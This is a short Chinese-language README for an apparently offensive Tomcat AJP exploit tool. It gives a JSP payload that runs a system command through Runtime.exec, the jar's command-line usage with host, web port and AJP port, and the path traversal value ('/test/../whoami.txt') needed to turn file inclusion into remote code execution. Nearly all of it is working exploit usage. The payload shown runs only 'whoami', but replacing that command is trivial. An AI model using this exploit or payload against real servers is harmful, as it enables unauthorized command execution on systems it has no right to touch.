# tomcat-ajp


webapps test目录下有个文件whoami.txt，内容：
<%out.println(new java.io.BufferedReader(new  java.io.InputStreamReader(Runtime.getRuntime().exec("whoami").getInputStream())).readLine());%>
rce: java -jar tomcat_ajp_exploit.jar 127.0.0.1 8080 8009 / /test/../whoami.txt
要想rce， 第一个参数必须设置成/, 第二个参数设置成被执行文件的类路径/test/../whoami.txt（测试的结果需要加../ ，否则提示找不到文件）
java -jar tomcat_ajp_exploit.jar 127.0.0.1 8080 8009 /test/ ../whoami.txt 如果test路径不存在，则读去的是root目录下的whoami.txt
System.out.println("java -jar xxx.jar host webport ajpport webpath filepath");
